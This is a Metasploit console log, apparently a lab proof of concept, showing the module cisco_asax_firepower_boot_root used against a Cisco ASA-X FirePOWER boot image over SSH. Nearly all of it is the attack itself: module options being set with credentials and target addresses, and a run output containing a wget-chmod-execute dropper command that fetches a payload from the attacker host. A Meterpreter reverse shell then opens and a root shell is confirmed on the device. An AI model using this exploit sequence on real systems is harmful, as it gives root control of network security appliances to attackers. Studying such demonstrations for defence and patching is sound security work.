```
albinolobster@ubuntu:~/metasploit-framework$ ./msfconsole 
                                                  
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.2.5-dev-ed2c64bffd                ]
+ -- --=[ 2228 exploits - 1172 auxiliary - 398 post       ]
+ -- --=[ 863 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules

[*] Starting persistent handler(s)...
msf6 > use exploit/linux/ssh/cisco_asax_firepower_boot_root
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > show options

Module options (exploit/linux/ssh/cisco_asax_firepower_boot_root):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   ENABLE_PASSWORD                   yes       The enable password
   IMAGE_PATH                        yes       The path to the image on the ASA (e.g. disk0:/asasfr-5500x-boot-6.2.3-4.img
   PASSWORD         cisco123         yes       The password for authentication
   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT            22               yes       The target port (TCP)
   SRVHOST          0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT          8080             yes       The local port to listen on.
   SSL              false            no        Negotiate SSL for incoming connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                           no        The URI to use for this exploit (default is random)
   USERNAME         cisco            yes       The username for authentication


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > set IMAGE_PATH disk0:/asasfr-5500x-boot-6.2.3-4.img
IMAGE_PATH => disk0:/asasfr-5500x-boot-6.2.3-4.img
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > set USERNAME albinolobster
USERNAME => albinolobster
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > set LHOST 10.12.70.252
LHOST => 10.12.70.252
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > set RHOST 10.12.70.253
RHOST => 10.12.70.253
msf6 exploit(linux/ssh/cisco_asax_firepower_boot_root) > run

[*] Started reverse TCP handler on 10.12.70.252:4444 
[*] Executing Linux Dropper for linux/x86/meterpreter/reverse_tcp
[*] Using URL: http://10.12.70.252:8080/ieXiNV
[*] 10.12.70.253:22 - Attempting to login...
[+] Authenticated with the remote server
[*] Resetting SFR. Sleep for 120 seconds
[*] Booting the image... this will take a few minutes
[*] Configuring DHCP for the image
[*] Dropping to the root shell
[*] wget -qO /tmp/scOKRuCR http://10.12.70.252:8080/ieXiNV;chmod +x /tmp/scOKRuCR;/tmp/scOKRuCR;rm -f /tmp/scOKRuCR
[*] Client 10.12.70.253 (Wget) requested /ieXiNV
[*] Sending payload to 10.12.70.253 (Wget)
[*] Sending stage (989032 bytes) to 10.12.70.253
[*] Meterpreter session 1 opened (10.12.70.252:4444 -> 10.12.70.253:53445) at 2022-07-05 07:37:22 -0700
[+] Done!
[*] Command Stager progress - 100.00% done (111/111 bytes)
[*] Server stopped.

meterpreter > shell
Process 2160 created.
Channel 1 created.
uname -a
Linux asasfr 3.10.107sf.cisco-1 #1 SMP PREEMPT Fri Nov 10 17:06:45 UTC 2017 x86_64 GNU/Linux
id
uid=0(root) gid=0(root)
```
